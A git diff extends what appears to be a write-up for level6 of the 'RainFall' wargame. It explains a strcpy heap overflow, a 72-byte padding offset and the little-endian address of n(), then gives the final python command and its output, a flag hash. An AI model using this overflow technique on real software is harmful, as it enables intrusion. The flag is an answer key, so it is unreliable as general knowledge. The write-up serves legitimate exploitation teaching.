@@ -171,4 +171,30 @@ This function:
 
 The `strcpy()` function is vulnerable to buffer overflow because it does not check if the `destination` buffer is large enough to contain the `source` string. Similarly, the program does not perform this check before calling `strcpy()` . 
 
-The destination buffer has a size of `0x40` bytes. By providing a 64-byte string as `argv[1]`, we can overflow the buffer.
+### Overwriting the address
+
+To achieve our goal, we need to craft a string such that the total number of characters printed is `72` which is number of bytes between the pointer of the 1st and 2nd malloc allocation.  
+
+This gives us : 
+
+```bash
+'a' * 72
+```
+
+### Converting the address
+
+The `n()` function is located at the address `0x8048454`. To properly inject this address, we need to represent it in **little-endian** format, as this is how memory addresses are stored on the target system. The little-endian format for the address `0x8048454` is:  `\x54\x84\x04\x08` .
+
+**Little-endian** is a way of representing multi-byte data in memory where the **least significant byte** (the "lowest" byte) is stored at the **lowest memory address**, and the **most significant byte** is stored at the highest memory address.
+
+```nasm
+'\x54\x84\x04\x08'
+```
+
+### Final command
+```bash
+The final command is :
+level6@RainFall:~$ python -c "print('a' * 72 + '\x54\x84\x04\x08')" > /tmp/level6
+level6@RainFall:~$ ./level6 `cat /tmp/level6`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
